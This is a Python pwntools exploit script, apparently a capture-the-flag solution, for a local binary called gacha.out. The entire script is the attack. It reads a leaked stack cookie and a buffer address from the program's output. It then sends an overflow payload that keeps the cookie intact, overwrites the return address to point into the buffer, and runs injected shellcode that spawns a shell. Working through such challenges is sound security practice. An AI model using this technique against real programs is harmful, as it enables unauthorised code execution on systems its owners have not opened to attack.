from pwn import *

if __name__ == '__main__':
    # should be the default, but double checking this
    context.arch = 'i386'

    p = process('./gacha.out')

    p.sendline('1')
    p.recvuntil('Ticket no: ')
    # first ticket number is the stack cookie leak
    cookie = int(p.readline())
    p.recvuntil('is: ')
    # lucky number is just a pointer to the beginning of the array
    arr = int(p.readline())

    print(hex(cookie))

    # sub is to lower the stack, since our shellcode will push to it
    # but our shellcode is on the stack too, so it might clobber itself
    # this might not be strictly necessary
    p.sendline(b'A'*32 + p32(cookie) + b'CCCC' + b'DDDD' + b'EEEE' + p32(arr + 52) + asm('sub sp, 0xffff' + shellcraft.linux.sh()))

    # exit the game
    p.recvuntil('option!')
    p.recvuntil('2. Exit')
    p.sendline('2')
    p.clean()
    p.sendline('echo got a shell!')
    p.interactive()
